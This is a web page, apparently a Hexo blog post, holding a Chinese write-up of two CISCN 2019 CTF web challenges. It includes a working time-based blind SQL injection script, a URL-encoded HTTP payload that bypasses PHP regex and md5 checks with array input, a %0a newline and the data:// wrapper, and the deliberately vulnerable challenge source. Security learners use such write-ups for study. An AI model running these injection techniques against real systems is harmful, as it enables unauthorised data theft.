@@ -1,0 +1,143 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ciscn_1/2_web | Hexo</title>
+
+  
+  <meta name="author" content="John Doe">
+  
+
+  
+  <meta name="description" content="day_2web_2_**echo “Null … Null … Null … “;
+if(isset($_GET[‘src’])) {    die(highlight_file(‘index.php’, true));}
+error_reporting(0);if($_REQUEST){    ">
+  
+
+  
+  
+  <meta name="keywords" content="">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="ciscn_1/2_web"/>
+
+  <meta property="og:site_name" content="Hexo"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Hexo</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>ciscn_1/2_web</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/06/10/ciscn-1-2-web/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-06-10T06:54:35.000Z">
+          2019-06-10
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="day-2"><a href="#day-2" class="headerlink" title="day_2"></a><em><strong>day_2</strong></em></h1><h2 id="web-2"><a href="#web-2" class="headerlink" title="web_2"></a><em><strong>web_2</strong></em></h2><p>_**echo “Null … Null … Null … “;</p>
+<p>if(isset($_GET[‘src’])) {<br>    die(highlight_file(‘index.php’, true));<br>}</p>
+<p>error_reporting(0);<br>if($_REQUEST){<br>    foreach ($_REQUEST as $key =&gt; $value) {<br>        if(preg_match(‘/[a-zA-Z]/i’, $value)) die(‘Hello Hack.’);<br>    }<br>}</p>
+<p>if($_SERVER){<br>    if(preg_match(‘/cyber|flag|ciscn/i’, $_SERVER[‘QUERY_STRING’])) die(‘Hello Hack..’);<br>}</p>
+<p>if(isset($<em>GET[‘cyber’])){<br>    if(!(substr($_GET[‘cyber’], 32) === md5($_GET[‘cyber’]))){<br>        die(‘Hello Hack…’);<br>    }else{<br>        if(preg_match(‘/^ciscnsec$/‘, $_GET[‘ciscn’]) &amp;&amp; $_GET[‘ciscn’] !== ‘ciscnsec’){<br>            $getflag = file_get_contents($_GET[‘flag’]);<br>        }else<br>            die(‘Hello Hack….’);<br>        if(isset($getflag) &amp;&amp; $getflag === ‘security’){<br>            include ‘flag.php’;<br>            echo $flag;<br>        }else die(‘Hello Hack…..’);<br>    }<br>}**</em></p>
+<h3 id="首先是第一个check-，post上去一个与key-一样的数字就行"><a href="#首先是第一个check-，post上去一个与key-一样的数字就行" class="headerlink" title="首先是第一个check_，post上去一个与key_一样的数字就行"></a>首先是第一个<em><strong>check</strong>_，</em><strong>post</strong><em>上去一个与</em><strong>key</strong>_一样的数字就行</h3><h3 id="第二个check-因为是-SERVER-‘QUERY-STRING’-获取的uri，所以可以经过url-编码直接搞定"><a href="#第二个check-因为是-SERVER-‘QUERY-STRING’-获取的uri，所以可以经过url-编码直接搞定" class="headerlink" title="第二个check_因为是$_SERVER[‘QUERY_STRING’]获取的uri，所以可以经过url_编码直接搞定"></a>第二个<em><strong>check</strong>_因为是</em><strong>$_SERVER[‘QUERY_STRING’]</strong><em>获取的</em><strong>uri</strong><em>，所以可以经过</em><strong>url</strong>_编码直接搞定</h3><h3 id="第三个-check-很常见，提交数组格式完成绕过"><a href="#第三个-check-很常见，提交数组格式完成绕过" class="headerlink" title="第三个_check_很常见，提交数组格式完成绕过"></a>第三个_<strong>check</strong>_很常见，提交数组格式完成绕过</h3><h3 id="第四个check-关键点在于preg-match的多个模式，由于没有开启-d，那么用-0a-换行即可"><a href="#第四个check-关键点在于preg-match的多个模式，由于没有开启-d，那么用-0a-换行即可" class="headerlink" title="第四个check_关键点在于preg_match的多个模式，由于没有开启/d，那么用%0a_换行即可"></a>第四个<em><strong>check</strong>_关键点在于</em><strong>preg_match</strong><em>的多个模式，由于没有开启</em><strong>/d</strong><em>，那么用</em><strong>%0a</strong>_换行即可</h3><h3 id="第五个check-可以看看php伪协议，使用data-text-plain-security-通过最后一段校验"><a href="#第五个check-可以看看php伪协议，使用data-text-plain-security-通过最后一段校验" class="headerlink" title="第五个check_可以看看php伪协议，使用data://text/plain,security_通过最后一段校验"></a>第五个<em><strong>check</strong>_可以看看<a href="https://www.highker.wiki/ctf/web/php_protocols.html" target="_blank" rel="noopener">php伪协议</a>，使用</em><strong>data://text/plain,security</strong>_通过最后一段校验</h3><h3 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终<strong><em>payload</em></strong></h3><p><em>*_POST /?%63%79%62%65%72%5b%5d&amp;%63%69%73%63%6e=%63%69%73%63%6e%73%65%63%0a&amp;%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%73%65%63%75%72%69%74%79 HTTP/1.1<br>Host: 127.0.0.1:8888<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,</em>/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 18<br>Connection: close<br>Upgrade-Insecure-Requests: 1</p>
+<p>ciscn=777&amp;flag=777_** </p>
+<h2 id="web-1"><a href="#web-1" class="headerlink" title="web_1"></a><strong><em>web_1</em></strong></h2><h3 id="很简单的一个time-based-sql-injection-，因为一开始直接告诉了表名和列名，并且预先知道-flag-格式与长度，可以只跑-6-15-位，直接贴-payload"><a href="#很简单的一个time-based-sql-injection-，因为一开始直接告诉了表名和列名，并且预先知道-flag-格式与长度，可以只跑-6-15-位，直接贴-payload" class="headerlink" title="很简单的一个time based sql injection_，因为一开始直接告诉了表名和列名，并且预先知道_flag_格式与长度，可以只跑_6~15_位，直接贴_payload"></a><strong>很简单的一个<em>time based sql injection_，因为一开始直接告诉了表名和列名，并且预先知道_flag_格式与长度，可以只跑_6~15_位，直接贴_payload</em></strong></h3><p><strong><em>import requests</em></strong><br><strong><em>import time</em></strong><br><strong><em>url = “<a href="http://localhost:8888/web1/index.php&quot;" target="_blank" rel="noopener">http://localhost:8888/web1/index.php&quot;</a></em></strong><br><strong><em>list = “1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM{}</em>!@#$%^&amp;*()”_</strong><br><strong><em>flag = “”</em></strong><br><strong><em>payload = ‘elt(ascii(substr((select(flag)from(ctf)),{q},1))={attack},sleep(1))’</em></strong><br> <strong><em>for a in range(6,16):</em></strong><br> <strong><em>for l in list:</em></strong><br> <strong><em>data = {“id”:payload.format(q=a,attack=ord(l))}</em></strong><br> <strong><em>start = time.time()</em></strong><br> <strong><em>req = requests.post(url, data = data)</em></strong><br> <strong><em>if time.time()-start &gt; 2:</em></strong><br> <strong><em>flag += l</em></strong><br> <strong><em>print flag</em></strong><br> <strong><em>break</em></strong></p>
+<p>*<em>下面是它的源码 *</em></p>
+<p><em><strong>$dbuser=’root’;</strong></em><br><em><strong>//$dbuser=’root’;</strong></em><br><em><strong>$dbpass=’root’;</strong></em><br><em><strong>//$dbpass=’root’;</strong></em><br><em><strong>function safe($sql){</strong></em><br> <em><strong>$blackList = array(‘ ‘,’||’,’#’,’-‘,’;’,’&amp;’,’+’,’or’,’and’,’`’,’”‘,’insert’,’group’,’limit’,’update’,’delete’,’*’,’into’,’union’,’load_file’,’outfile’,’./‘);</strong></em><br> <em><strong>foreach($blackList as $blackitem){</strong></em><br> <em><strong>if(stripos($sql,$blackitem)){</strong></em><br> <em><strong>return False;</strong></em><br> <em><strong>}</strong></em><br> <em><strong>}</strong></em><br> <em><strong>return True;</strong></em><br><em><strong>}</strong></em><br><em><strong>if(isset($_POST[‘id’])){</strong></em><br> <em><strong>$id = $_POST[‘id’];</strong></em><br><em><strong>}else{</strong></em><br> <em><strong>die();</strong></em><br><em><strong>}</strong></em><br><em><strong>$db = mysql_connect(“localhost”,$dbuser,$dbpass);</strong></em><br><em><strong>if(!$db){</strong></em><br> <em><strong>die(mysql_error());</strong></em><br><em><strong>}</strong></em><br><em><strong>mysql_select_db(“ctf”,$db);</strong></em><br><em><strong>if(safe($id)){</strong></em><br> <em><strong>$query = mysql_query(“SELECT content from passage WHERE id = ${id} limit 0,1”);</strong></em><br> <em><strong>if($query){</strong></em><br> <em><strong>$result = mysql_fetch_array($query);</strong></em><br>        <strong>if($result){</strong><br> <em><strong>echo $result[‘content’];</strong></em><br> <em><strong>}else{</strong></em><br> <em><strong>echo “Error Occured When Fetch Result.”;</strong></em><br> <em><strong>}</strong></em><br> <em><strong>}else{</strong></em><br> <em><strong>var_dump($query);</strong></em><br> <em><strong>}</strong></em> <em><strong>}else{</strong></em><br> <em><strong>die(“SQL Injection Checked.”);</strong></em><br><em><strong>}</strong></em></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/web/">web</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2019 John Doe
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+</body>
+</html>
